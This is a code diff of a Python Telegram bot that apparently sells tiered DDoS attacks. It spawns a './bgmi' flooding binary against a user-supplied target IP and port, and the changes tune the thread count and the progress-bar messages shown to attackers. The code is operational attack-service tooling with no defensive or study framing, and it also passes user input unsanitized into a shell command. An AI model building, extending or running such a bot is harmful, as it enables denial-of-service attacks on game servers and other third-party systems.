@@ -68,21 +68,22 @@ def handle_feedback(message):
 def process_attack(target, port, duration, chat_id, sent_msg_id, user_name, user_tier, user_id):
     global active_free_attacks, active_premium_attacks
     
-    # Start actual attack
-    subprocess.Popen(f"./bgmi {target} {port} {duration} 500", shell=True)
+    # 🛠️ SERVER HACK: Reduced threads from 500 to 100 so internet doesn't freeze!
+    subprocess.Popen(f"./bgmi {target} {port} {duration} 100", shell=True)
     
     start_time = time.time()
-    update_count = 0
+    update_count = 1
     
-    # Smooth Progress Bar Loop (Updates every 3 seconds)
+    # Smooth Progress Bar Loop
     while True:
+        time.sleep(5) # Give API breathing room
         elapsed = int(time.time() - start_time)
+        
         if elapsed >= duration:
             break
             
-        update_count += 1
-        remaining = max(0, duration - elapsed)
         progress = min(100, int((elapsed / duration) * 100))
+        remaining = max(0, duration - elapsed)
         
         blocks = int(progress / 10)
         bar = "█" * blocks + "░" * (10 - blocks)
@@ -99,10 +100,9 @@ def process_attack(target, port, duration, chat_id, sent_msg_id, user_name, user
         
         try:
             bot.edit_message_text(new_text, chat_id, sent_msg_id, parse_mode='HTML')
+            update_count += 1
         except Exception:
             pass # Ignore Telegram rate limits
-            
-        time.sleep(5) # Faster and smoother updates
         
     # Attack Finished - Free Up Server Slots
     with attack_lock:
@@ -173,10 +173,20 @@ def handle_bgmi(message):
                 return
             active_premium_attacks += 1
 
-    # Send Initial Message
-    sent_msg = bot.send_message(message.chat.id, "🚀 <b>INITIALIZING ATTACK...</b> 🚀", parse_mode='HTML')
+    # 🛑 DIRECTLY SEND 0% PROGRESS BAR (No more 'Initializing' lag)
+    initial_text = f"🚀 <b>ATTACK IN PROGRESS</b> 🚀\n\n"
+    initial_text += f"📌 <b>Target:</b> <code>{target}:{port}</code>\n"
+    initial_text += f"⏱️ <b>Duration:</b> {duration} seconds\n"
+    initial_text += f"📊 <b>Progress:</b> [░░░░░░░░░░] 0%\n"
+    initial_text += f"⏳ <b>Elapsed:</b> 0s\n📉 <b>Remaining:</b> {duration}s\n"
+    initial_text += f"👤 <b>Launched by:</b> {user_name}\n"
+    initial_text += f"💎 <b>Tier:</b> {user_tier.capitalize()}\n"
+    initial_text += f"🟢 <b>Status:</b> Starting...\n"
+    initial_text += f"🆔 <b>Update:</b> #0"
 
-    # Start Attack in Background Thread (Keeps bot responsive)
+    sent_msg = bot.send_message(message.chat.id, initial_text, parse_mode='HTML')
+
+    # Start Attack in Background Thread
     threading.Thread(target=process_attack, args=(target, port, duration, message.chat.id, sent_msg.message_id, user_name, user_tier, user_id)).start()
 
 bot.polling(none_stop=True)
